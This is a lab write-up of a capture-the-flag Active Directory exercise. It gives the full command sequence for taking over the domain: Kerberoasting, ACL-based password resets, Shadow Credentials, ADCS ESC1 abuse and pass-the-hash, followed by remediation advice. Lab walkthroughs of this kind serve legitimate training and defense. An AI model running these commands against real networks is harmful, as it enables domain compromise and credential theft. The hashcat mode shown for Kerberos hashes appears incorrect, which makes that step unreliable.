---
{"dg-publish":true,"permalink":"/arasaka/","dg-note-properties":{}}
---

# Arasaka AD — Penetration Test Report

---

|Field|Value|
|---|---|
|**Date**|2026-08-09|
|**Tester**|Eleni Tsermentseli|
|**Domain**|`hacksmarter.local`|
|**Target**|`10.1.215.137` (DC01.hacksmarter.local)|
|**Difficulty**|Easy|
|**Scenario**|Assumed Breach|

---

## Enumeration

### Nmap

Ran a full port scan against the target:

```shell
nmap -p- 10.1.215.137 -T4 --min-rate 5000 | grep open
```

Identified a classic Active Directory Domain Controller:

- **53** — DNS
- **88** — Kerberos
- **135/139/445** — SMB (signing: **True**)
- **389/3268** — LDAP (Domain: `hacksmarter.local`)
- **3389** — RDP
- **5985** — WinRM

Key findings:

- Domain: `hacksmarter.local`
- DC hostname: `DC01.hacksmarter.local`
- OS: Windows Server 2022 (Build 20348)

---

### User & Share Enumeration

Enumerated shares and users using provided starting credentials:

```shell
netexec smb 10.1.215.137 -u 'faraday' -p 'hacksmarter123' --shares
netexec smb 10.1.215.137 -u 'faraday' -p 'hacksmarter123' --users
```

Discovered users:

|Username|Description|
|---|---|
|`Administrator`|Built-in domain admin|
|`Goro`|Loyal to a fault|
|`alt.svc`|Trapped for eternity|
|`Yorinobu`|—|
|`Hanako`|Waiting at embers|
|`Faraday`|Starting user|
|`Smasher`|—|
|`Soulkiller.svc`|Certificate management for soulkiller AI|
|`Hellman`|—|
|`kei.svc`|Trapped for eternity|
|`Silverhand.svc`|Trapped for eternity|
|`Oda`|—|
|`the_emperor`|Recent password change|

---

## Initial Access

### Starting Credentials

Engagement began with assumed breach credentials:

```
faraday : hacksmarter123
```

Credentials validated successfully against SMB.

---

## Kerberoasting

Enumerated Service Principal Names (SPNs) and requested TGS tickets:

```shell
impacket-GetUserSPNs hacksmarter.local/faraday:'hacksmarter123' -dc-ip 10.1.215.137 -request
```

**Kerberoastable account found:**

|Account|SPN|
|---|---|
|`alt.svc`|`AI/blackwall.hacksmarter.local`|

Cracked the TGS hash using hashcat:

```shell
hashcat -a 0 -m 5600 alt_svc.hash /usr/share/wordlists/rockyou.txt
```

**Password found:** `babygirl1`

---

## BloodHound Enumeration

Collected domain data using BloodHound:

```shell
bloodhound-python -d hacksmarter.local -u faraday -p 'hacksmarter123' -ns 10.1.215.137 -c DCOnly --zip
```

### Attack Path Identified

```
faraday → (Kerberoast) → alt.svc
    ↓ GenericAll → Yorinobu
Yorinobu password reset
    ↓ GenericWrite → Soulkiller.svc
Shadow Credentials (pywhisker)
    ↓ NT hash → Soulkiller.svc
ESC1 (AI_Takeover template)
    ↓ Certificate as Administrator
LDAP shell → password change
    ↓ NT hash → Administrator
evil-winrm → root.txt
```

---

## ACL Abuse — alt.svc → Yorinobu

`alt.svc` had **GenericAll** over `Yorinobu`. Reset the password:

```shell
net rpc password yorinobu 'Hacked123!' -U 'hacksmarter.local/alt.svc%babygirl1' -S 10.1.215.137
```

---

## ACL Abuse — Yorinobu → Soulkiller.svc (Shadow Credentials)

`Yorinobu` had **GenericWrite** over `Soulkiller.svc`. Used pywhisker to perform a Shadow Credentials attack:

```shell
pywhisker -d hacksmarter.local -u yorinobu -p 'Hacked123!' --dc-ip 10.1.215.137 \
  -t soulkiller.svc --action add
```

Retrieved NT hash via certipy:

```shell
/home/kali/.local/bin/certipy auth -pfx <generated>.pfx \
  -password '<generated>' -dc-ip 10.1.215.137 \
  -username soulkiller.svc -domain hacksmarter.local
```

**NT hash retrieved for `soulkiller.svc`.**

---

## ADCS Enumeration

Enumerated ADCS using Certipy:

```shell
/home/kali/.local/bin/certipy find -u 'soulkiller.svc@hacksmarter.local' \
  -hashes '<hash>' -dc-ip 10.1.215.137 -vulnerable -stdout
```

### Vulnerable Template Found

|Property|Value|
|---|---|
|Template Name|`AI_Takeover`|
|CA Name|`hacksmarter-DC01-CA`|
|Vulnerability|**ESC1**|
|Enrollment Rights|`HACKSMARTER.LOCAL\Soulkiller.svc`|
|Issue|Enrollee supplies subject + Client Authentication|

---

## ESC1 Exploitation

### Step 1 — Request Certificate as Administrator

```shell
/home/kali/.local/bin/certipy req \
  -u 'soulkiller.svc@hacksmarter.local' \
  -hashes '<hash>' \
  -dc-ip 10.1.215.137 \
  -target DC01.hacksmarter.local \
  -ca 'hacksmarter-DC01-CA' \
  -template 'AI_Takeover' \
  -upn 'administrator@hacksmarter.local'
```

Certificate saved to `administrator.pfx`.

### Step 2 — Authenticate and Retrieve NT Hash

```shell
/home/kali/.local/bin/certipy auth -pfx administrator.pfx -dc-ip 10.1.215.137
```

**Administrator password expired** — used LDAP shell to reset:

```shell
/home/kali/.local/bin/certipy auth -pfx administrator.pfx -dc-ip 10.1.215.137 -ldap-shell
# change_password administrator Hacked123!
```

**NT Hash retrieved:**

```
aad3b435b51404eeaad3b435b51404ee:dda1e66a984215e9f233baf23c316bc6
```

---

## Shell as Administrator

Pass-the-Hash using Evil-WinRM:

```shell
evil-winrm -i 10.1.215.137 -u Administrator -H 'dda1e66a984215e9f233baf23c316bc6'
```

### Root Flag

```shell
type C:\Users\Administrator\Desktop\root.txt
```

> **Flag:** `fcf1dd0f08d1068a2f151fd2ec5ecf05`

---

## Vulnerabilities Summary

|#|Vulnerability|Severity|Impact|
|---|---|---|---|
|1|Kerberoastable service account (`alt.svc`)|High|Credential access|
|2|Weak password on service account|High|Account takeover|
|3|Excessive ACL — GenericAll (alt.svc → Yorinobu)|High|Lateral movement|
|4|Excessive ACL — GenericWrite (Yorinobu → Soulkiller.svc)|High|Shadow Credentials attack|
|5|ADCS ESC1 — AI_Takeover template misconfiguration|Critical|Domain Admin escalation|

---

## Remediation Recommendations

- **Use strong, unique passwords** for all service accounts
- **Remove unnecessary SPNs** from accounts that do not require Kerberos delegation
- **Review AD ACLs** — remove GenericAll/GenericWrite permissions not explicitly required
- **Fix ADCS template** — disable "Enrollee Supplies Subject" on `AI_Takeover` or restrict enrollment rights to privileged accounts only
- **Implement tiering model** — separate service accounts from user accounts and limit cross-tier ACLs
- **Monitor for Shadow Credential attacks** — audit `msDS-KeyCredentialLink` attribute modifications

---

_Report generated for HackSmarter Labs — Arasaka AD Easy_